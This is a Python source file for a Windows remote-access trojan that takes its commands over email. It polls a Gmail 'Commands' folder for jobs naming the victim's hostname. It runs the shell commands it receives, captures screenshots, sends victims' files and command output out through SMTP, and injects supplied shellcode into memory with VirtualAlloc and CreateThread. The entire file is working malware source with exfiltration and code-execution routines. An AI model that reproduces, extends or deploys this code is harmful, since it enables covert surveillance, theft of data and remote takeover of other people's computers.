import subprocess
import sys
import os
import base64
import binascii
import threading
import time
import random
import string
import imaplib
import email
from PIL import ImageGrab
import ctypes
import win32process, win32api, win32con, win32gui, win32security
from ntsecuritycon import *
from win32com.shell import shell
from smtplib import SMTP
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders

# generate random strings
def generate_random_string(low,high):
    length=random.randint(low,high)
    letters=string.ascii_letters+string.digits
    return ''.join([random.choice(letters) for _ in range(length)])
    rand_gen=random_string()
    return rand_gen

#######################################
gmail_user = ''
gmail_pwd = ''
server = "smtp.gmail.com"
server_port = 587
#######################################

FirstRun = True

#print errors
global verbose;
verbose = True

#enviroment variable for the victims hostname
hostname = os.environ['COMPUTERNAME']

#are we running as admin?
AdminPrivs = shell.IsUserAnAdmin()


def detectForgroundWindow():
	return win32gui.GetWindowText(win32gui.GetForegroundWindow())

def screenshot():
	try:
		screen_dir = os.getenv('TEMP')
		rand_name = generate_random_string(5,15)
		img=ImageGrab.grab()
		saveas= os.path.join(screen_dir, rand_name + '.png')
		img.save(saveas)
		SendEmail('Screenshot taken', saveas)
		os.remove(saveas)
		return
	except Exception, e:
		if verbose == True: print e
		pass

def SendEmail(text, attachment=None):
	msg = MIMEMultipart()
	msg['From'] = hostname
	msg['To'] = gmail_user
	msg['Subject'] = hostname + '- Admin: ' + str(AdminPrivs)
	msg.attach(MIMEText("Current foreground window: " + str(detectForgroundWindow()) + "\n" + str(text)))
	
	if attachment:
		if type(attachment) == list:
			for attach in attachment:
				if os.path.exists(attach) == True:	
					part = MIMEBase('application', 'octet-stream')
					part.set_payload(open(attach, 'rb').read())
					Encoders.encode_base64(part)
					part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
					msg.attach(part)
		else:
			if os.path.exists(attachment) == True:
				part = MIMEBase('application', 'octet-stream')
				part.set_payload(open(attachment, 'rb').read())
				Encoders.encode_base64(part)
				part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attachment))
				msg.attach(part)

	while True:
		try:
			mailServer = SMTP()
			mailServer.connect(server, server_port)
			mailServer.starttls()
			mailServer.login(gmail_user,gmail_pwd)
			mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
			mailServer.quit()
			break
		except Exception, e:
			if verbose == True:
				print e
			time.sleep(10)

def ExecCmd(command):
	try:
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdout_value = proc.stdout.read()
		stdout_value += proc.stderr.read()
		SendEmail("Ran command: %s\n%s"% (command,stdout_value))
		return
	except Exception, e:
		if verbose == True: print e
		pass

def download(file): #upload a file to the victims system
	if os.path.exists(file) == True:
		try:
			SendEmail('Downloaded file ' + str(file), file)
		except Exception, e:
			if verbose == True: print e
			SendEmail('Download Failed: ' + str(e))
			pass

def lockWorkstation():
	ctypes.windll.user32.LockWorkStation()

def execShellcode(shellc):
	#inject shellcode into memory
	#pyinjector style
	try:
		shellcode = bytearray(shellc)

		ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), 
											  	  ctypes.c_int(len(shellcode)), 
											  	  ctypes.c_int(0x3000), 
											  	  ctypes.c_int(0x40))
	
		buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
	
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), 
											 buf, 
										 	 ctypes.c_int(len(shellcode))) 
		
		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             	 ctypes.c_int(0),
                                             	 ctypes.c_int(ptr),
                                             	 ctypes.c_int(0),
                                             	 ctypes.c_int(0),
                                             	 ctypes.pointer(ctypes.c_int(0)))
		
		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
	
		SendEmail("Executed supplied shellcode")
	except Exception, e:
		if verbose == True: print e
		pass


def checkJobs():
	#This is the main thread, we check the inbox labeled 'Commands' for queued jobs, 
	#parse them and send back the results
	while True:
		try:
			connection = imaplib.IMAP4_SSL(server) #Connect to server
			connection.login(gmail_user, gmail_pwd)
			c = connection
			c.select("Commands")
				
			try:
				typ, id_list = c.search(None, '(SUBJECT "%s")' % (hostname))
			except Exception:
				typ, id_list = c.search(None, '(SUBJECT "ALL")')
				
			msg_ids = id_list[0].replace(" ", ",")
			typ, msg_data = c.fetch(msg_ids, '(RFC822)')

			for response_part in msg_data:
				if isinstance(response_part, tuple):
					msg = email.message_from_string(response_part[1])
					maintype = msg.get_content_maintype()
					if maintype == 'multipart':
						for part in msg.get_payload():
							if part.get_content_maintype() == 'text':
								commands = part.get_payload().rstrip("\r\n")
					elif maintype == 'text':
						commands = msg.get_payload().rstrip("\r\n")
				c.store(msg_ids, '+FLAGS', r'(\Deleted)')

			c.logout()

			#############################################################################################

			#This is where we define our commands
			commandsList = commands.split()

			if commandsList[0] == 'execshell': 
				t = threading.Thread(name='execshell', target=execShellcode, args=(commandsList[1],))
			elif commandsList[0] == 'download':
				t = threading.Thread(name='download', target=download, args=(commandsList[1],))
			elif commandsList[0] == 'screenshot':
				t = threading.Thread(name='screenshot', target=screenshot)
			else: 
				t = threading.Thread(name='ExecCmd', target=ExecCmd, args=(str(commands),))

			t.setDaemon(True)
			t.start()

			commandsList[:] = []
			time.sleep(10)
		
		except Exception, e:
			if verbose == True: print e
			time.sleep(5)



if __name__ == '__main__' :

	if FirstRun == True:
		SendEmail('New host checking in')
		FirstRun = False
		checkJobs()
	else:
		checkJobs()
